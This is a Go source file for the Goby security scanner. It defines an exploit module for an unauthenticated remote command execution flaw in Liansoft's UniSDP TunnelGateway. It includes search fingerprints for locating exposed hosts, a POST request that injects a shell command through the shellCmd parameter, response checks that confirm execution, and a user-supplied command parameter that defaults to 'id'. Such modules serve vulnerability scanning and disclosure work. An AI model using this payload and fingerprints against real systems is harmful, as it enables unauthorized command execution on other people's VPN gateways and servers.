package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "UniSDP Unauth commondRetSt RCE",
    "Description": "<p>The UniSDP software-defined boundary system of Liansoft Security is a next-generation VPN based on zero trust. There is a security vulnerability in an interface of TunnelGateway in version 2021.04.28 of the system. The vulnerability allows attackers to send specially crafted requests to the server and execute remote commands.</p>",
    "Impact": "UniSDP Unauth commondRetSt RCE",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.leagsoft.com/doc/article/102632.html\">https://www.leagsoft.com/doc/article/102632.html</a> </p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Product": "UniSDP",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "联软安界 UniSDP 软件定义边界系统 commondRetSt 命令执行漏洞",
            "Description": "<p>联软安界UniSDP软件定义边界系统是基于零信任的下一代VPN，该系统2021.04.28版本中TunnelGateway某接口存在安全漏洞，漏洞允许攻击者将特制请求发送到服务器并远程命令执行。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br><br></p>",
            "Recommendation": "<p>1、目前没有提供详细的解决方案，请关注厂商主页更新：<a href=\"https://www.leagsoft.com/doc/article/102632.html\" rel=\"nofollow\">https://www.leagsoft.com/doc/article/102632.html</a>&nbsp;</p><p>2. 通过防火墙等安全设备设置访问策略和白名单访问。<br></p>",
            "Product": "联软安界UniSDP软件定义边界系统",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "UniSDP Unauth commondRetSt RCE",
            "Description": "<p>The UniSDP software-defined boundary system of Liansoft Security is a next-generation VPN based on zero trust. There is a security vulnerability in an interface of TunnelGateway in version 2021.04.28 of the system. The vulnerability allows attackers to send specially crafted requests to the server and execute remote commands.<br></p>",
            "Impact": "UniSDP Unauth commondRetSt RCE",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.leagsoft.com/doc/article/102632.html\" rel=\"nofollow\">https://www.leagsoft.com/doc/article/102632.html</a>&nbsp;</p><p>2. Set access policies and whitelist access through security devices such as firewalls.<br></p>",
            "Product": "UniSDP",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "banner=\"UniSSOView\" || header=\"UniSSOView\" || body=\"UniSSOView\" || banner=\"Set-Cookie: sdp_jsessionid=\" || header=\"Set-Cookie: sdp_jsessionid=\"",
    "GobyQuery": "banner=\"UniSSOView\" || header=\"UniSSOView\" || body=\"UniSSOView\" || banner=\"Set-Cookie: sdp_jsessionid=\" || header=\"Set-Cookie: sdp_jsessionid=\"",
    "Author": "jweny",
    "Homepage": "https://www.leagsoft.com/doc/article/102632.html",
    "DisclosureDate": "2022-06-15",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.9",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/TunnelGateway/commondRetStr",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "shellCmd=echo justfottest"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "justfottest",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"msg\":\"success\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/TunnelGateway/commondRetStr",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "shellCmd=echo justfottest"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "justfottest",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"msg\":\"success\"",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10477"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
